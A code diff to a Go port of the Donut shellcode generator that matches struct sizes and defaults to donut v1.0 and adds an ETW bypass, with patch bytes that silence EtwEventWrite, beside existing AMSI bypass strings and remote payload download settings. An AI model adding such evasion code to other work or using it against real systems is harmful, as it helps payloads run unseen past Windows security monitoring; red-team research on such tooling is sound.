@@ -126,7 +126,7 @@ func Sandwich(arch DonutArch, payload *bytes.Buffer) (*bytes.Buffer, error) {
 	}
 	w.WriteByte(0x59)
 
-	picLen := int(instanceLen) + 32
+	picLen := int(instanceLen)
 
 	switch arch {
 	case X32:
@@ -170,7 +170,12 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 	mod.ModType = uint32(config.Type)
 	mod.Thread = uint32(config.Thread)
 	mod.Unicode = uint32(config.Unicode)
-	mod.Compress = uint32(config.Compress)
+	// DONUT_COMPRESS_NONE=1 in C donut (0 is invalid)
+	if config.Compress == 0 {
+		mod.Compress = 1
+	} else {
+		mod.Compress = uint32(config.Compress)
+	}
 
 	if config.Type == DONUT_MODULE_NET_DLL ||
 		config.Type == DONUT_MODULE_NET_EXE {
@@ -242,8 +247,13 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 
 	inst := new(DonutInstance)
 	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
-	instLen := uint32(3312 + 352 + 8)         //todo: that's how big it is in the C version...
+	instLen := uint32(4760) // donut v1.0 instance struct size (empirically matched to Python donut)
 	inst.Bypass = uint32(config.Bypass)
+	if config.Headers == 0 {
+		inst.Headers = 1 // DONUT_HEADERS_OVERWRITE (default in C donut)
+	} else {
+		inst.Headers = uint32(config.Headers)
+	}
 
 	// if this is a PIC instance, add the size of module
 	// that will be appended to the end of structure
@@ -370,6 +380,12 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
 	copy(inst.AmsiScanStr[:], "AmsiScanString")
 
+	copy(inst.EtwEventWrite[:], "EtwEventWrite")
+	copy(inst.EtwEventUnregister[:], "EtwEventUnregister")
+	inst.EtwRet64 = [1]byte{0xC3}
+	inst.EtwRet32 = [4]byte{0xC2, 0x14, 0x00, 0x00}
+	copy(inst.Ntdll[:], "ntdll")
+
 	// stuff for PE loader
 	if len(config.Parameters) > 0 {
 		copy(inst.Dataname[:], ".data")
@@ -415,11 +431,10 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 			log.Println("Setting URL parameters")
 		}
 		// append module name
-		copy(inst.Url[:], config.URL+"/"+config.ModuleName)
-		// set the request verb
-		copy(inst.Req[:], "GET")
+		copy(inst.Server[:], config.URL+"/"+config.ModuleName)
+		copy(inst.HttpReq[:], "GET")
 		if config.Verbose {
-			log.Println("Payload will attempt download from:", string(inst.Url[:]))
+			log.Println("Payload will attempt download from:", string(inst.Server[:]))
 		}
 	}
 
@@ -462,13 +477,13 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	}
 	instData := b.Bytes()
 	offset := 4 + // Len uint32
-		CipherKeyLen + CipherBlockLen + // Instance Crypt
-		4 + // pad
+		CipherKeyLen + CipherBlockLen + // Instance Crypt (32)
+		4 + // alignment padding
 		8 + // IV
-		(64 * 8) + // Hashes (64 uuids of len 64bit)
+		(64 * 8) + // Hashes (512)
 		4 + // exit_opt
 		4 + // entropy
-		8 // OEP
+		4 // OEP (uint32 in v1.0)
 
 	encInstData := Encrypt(
 		inst.KeyMk[:],
